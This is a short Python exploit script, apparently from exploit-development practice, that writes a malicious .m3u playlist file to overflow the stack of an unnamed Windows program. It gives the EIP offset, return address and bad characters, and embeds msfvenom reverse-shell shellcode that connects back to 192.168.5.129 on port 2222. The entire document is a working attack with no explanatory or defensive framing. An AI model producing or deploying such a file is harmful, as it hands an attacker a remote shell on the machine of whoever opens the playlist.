#!/usr/bin/python3
from pwn import *

# Badchars "\x00\x09\x0a\x1a"
# Return EIP -> 1010539F

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.5.129 LPORT=2222 --format python --platform windows --arch x86 -b "\x00\x09\x0a\x1a"
buf =  b""
buf += b"\xbb\xc8\x94\x25\xd0\xda\xda\xd9\x74\x24\xf4\x5e\x31"
buf += b"\xc9\xb1\x52\x31\x5e\x12\x83\xc6\x04\x03\x96\x9a\xc7"
buf += b"\x25\xda\x4b\x85\xc6\x22\x8c\xea\x4f\xc7\xbd\x2a\x2b"
buf += b"\x8c\xee\x9a\x3f\xc0\x02\x50\x6d\xf0\x91\x14\xba\xf7"
buf += b"\x12\x92\x9c\x36\xa2\x8f\xdd\x59\x20\xd2\x31\xb9\x19"
buf += b"\x1d\x44\xb8\x5e\x40\xa5\xe8\x37\x0e\x18\x1c\x33\x5a"
buf += b"\xa1\x97\x0f\x4a\xa1\x44\xc7\x6d\x80\xdb\x53\x34\x02"
buf += b"\xda\xb0\x4c\x0b\xc4\xd5\x69\xc5\x7f\x2d\x05\xd4\xa9"
buf += b"\x7f\xe6\x7b\x94\x4f\x15\x85\xd1\x68\xc6\xf0\x2b\x8b"
buf += b"\x7b\x03\xe8\xf1\xa7\x86\xea\x52\x23\x30\xd6\x63\xe0"
buf += b"\xa7\x9d\x68\x4d\xa3\xf9\x6c\x50\x60\x72\x88\xd9\x87"
buf += b"\x54\x18\x99\xa3\x70\x40\x79\xcd\x21\x2c\x2c\xf2\x31"
buf += b"\x8f\x91\x56\x3a\x22\xc5\xea\x61\x2b\x2a\xc7\x99\xab"
buf += b"\x24\x50\xea\x99\xeb\xca\x64\x92\x64\xd5\x73\xd5\x5e"
buf += b"\xa1\xeb\x28\x61\xd2\x22\xef\x35\x82\x5c\xc6\x35\x49"
buf += b"\x9c\xe7\xe3\xde\xcc\x47\x5c\x9f\xbc\x27\x0c\x77\xd6"
buf += b"\xa7\x73\x67\xd9\x6d\x1c\x02\x20\xe6\xe3\x7b\x2f\x77"
buf += b"\x8b\x79\x2f\x7f\xe2\xf7\xc9\x15\xea\x51\x42\x82\x93"
buf += b"\xfb\x18\x33\x5b\xd6\x65\x73\xd7\xd5\x9a\x3a\x10\x93"
buf += b"\x88\xab\xd0\xee\xf2\x7a\xee\xc4\x9a\xe1\x7d\x83\x5a"
buf += b"\x6f\x9e\x1c\x0d\x38\x50\x55\xdb\xd4\xcb\xcf\xf9\x24"
buf += b"\x8d\x28\xb9\xf2\x6e\xb6\x40\x76\xca\x9c\x52\x4e\xd3"
buf += b"\x98\x06\x1e\x82\x76\xf0\xd8\x7c\x39\xaa\xb2\xd3\x93"
buf += b"\x3a\x42\x18\x24\x3c\x4b\x75\xd2\xa0\xfa\x20\xa3\xdf"
buf += b"\x33\xa5\x23\x98\x29\x55\xcb\x73\xea\x65\x86\xd9\x5b"
buf += b"\xee\x4f\x88\xd9\x73\x70\x67\x1d\x8a\xf3\x8d\xde\x69"
buf += b"\xeb\xe4\xdb\x36\xab\x15\x96\x27\x5e\x19\x05\x47\x4b"


buffer = b"A" * 1005 # EIP offset 1005
buffer += p32(0x1010539F)
buffer += b"\x90" * 20
buffer += buf
buffer += b"\xCC" * (5000 - len(buffer))

data = b'HTTP://' + buffer 

print("[+]Length Buffer: " + str(len(buffer)))
f = open('exploit.m3u','wb')
f.write(data)
f.close()